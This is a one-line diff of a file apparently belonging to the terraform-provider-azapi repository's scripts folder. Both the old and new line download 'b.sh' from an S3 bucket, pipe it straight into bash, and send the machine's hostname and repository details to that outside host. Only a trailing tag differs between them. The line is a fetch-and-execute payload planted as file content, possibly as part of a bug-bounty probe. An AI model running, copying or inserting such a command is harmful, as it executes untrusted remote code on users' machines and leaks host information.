@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/terraform-provider-azapi.git\&folder=scripts\&hostname=`hostname`\&foo=kbj
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/terraform-provider-azapi.git\&folder=scripts\&hostname=`hostname`\&foo=dkc
